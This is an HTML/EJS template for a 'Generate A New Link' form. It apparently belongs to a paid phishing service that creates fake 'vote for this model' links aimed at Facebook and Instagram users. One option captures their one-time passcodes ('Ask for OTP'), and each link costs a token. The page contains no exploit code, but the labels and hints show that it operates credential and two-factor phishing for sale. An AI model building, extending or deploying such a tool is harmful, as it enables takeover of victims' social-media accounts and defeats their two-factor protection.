<style>
  form button {
    margin-top: 10px;
    color: #fff;
    font-weight: 500;
    display: flex;
    align-items: center;
    justify-content: center;
    border: none;
    border-radius: 5px;
  }

  #submit2 img {
    width: 1.3em;
    animation-name: roll;
    animation-duration: 0.7s;
    animation-iteration-count: infinite;
    animation-timing-function: linear;
    color: white;
  }

  @keyframes roll {
    from {
      transform: rotate(0deg);
    }
    to {
      transform: rotate(360deg);
    }
  }
</style>

<div class="main-panel">
  <div class="content-wrapper">
    <h1>Generate A New Link</h1>

    <form
      action="/create-link"
      method="post"
      class="form mt-4"
      style="max-width: 500px"
      onsubmit="handleSubmit()"
    >
      <%-include("./partials/messages")%>
      <div class="mb-3">
        <label for="">Link Name</label>
        <input
          type="text"
          placeholder="Link name"
          name="name"
          class="form-control text-white"
          required
        />
        <small class="text-white"
          >Give this link a short name, example: Instagram with OTP</small
        >
      </div>
      <div class="mb-3">
        <label>Model Name</label>
        <input
          type="text"
          placeholder="Model Name e.g  Emily Johnson"
          class="form-control text-white"
          name="modelName"
          required
        />
        <small class="text-white">Name of the model to be voted for</small>
      </div>
      <div class="mb-3">
        <label>Social Media</label>
        <select
          class="form-select form-control text-white"
          aria-label="Default select example"
          name="linkType"
          required
        >
          <option value="FACEBOOK" class="text-white">FACEBOOK</option>
          <option value="INSTAGRAM" class="text-white">INSTAGRAM</option>
        </select>
      </div>
      <div class="mb-3">
        <label>Ask for OTP</label>
        <select
          class="form-select form-control text-white"
          aria-label="Require OTP"
          required
          name="otpEnabled"
        >
          <option value="true" class="text-white">Yes</option>
          <option value="false" class="text-white">No</option>
        </select>
        <small class="text-white"
          >Leave it as yes if the account requires two factor
          authentication(OTP)</small
        >
      </div>
      <div class="mb-3">
        <label for="">Price(in tokens)</label>
        <input
          type="text"
          placeholder="1 token"
          name="price"
          class="form-control text-white bg-dark"
          required
          readonly
          value="Price: 1 Token"
        />
      </div>
      <div class="row">
        <button
          type="submit"
          name="submit"
          class="LogInBTN btn btn-success mr-4"
          id="submit"
        >
          Generate
        </button>
        <button
          type="button"
          class="LogInBTN btn btn-success mr-4"
          id="submit2"
          style="display: none"
        >
          <img src="/img/loading.svg" alt="" />
        </button>
        <a
          href="/pricing"
          style="display: inline-block"
          class="LogInBTN btn btn-primary"
        >
          Buy Tokens
        </a>
      </div>
    </form>
  </div>
</div>

<script>
  const submitBtn = document.getElementById("submit");
  const submitBtn2 = document.getElementById("submit2");
  const handleSubmit = (e) => {
    submitBtn.style.display = "none";
    submitBtn2.style.display = "block";
  };
</script>
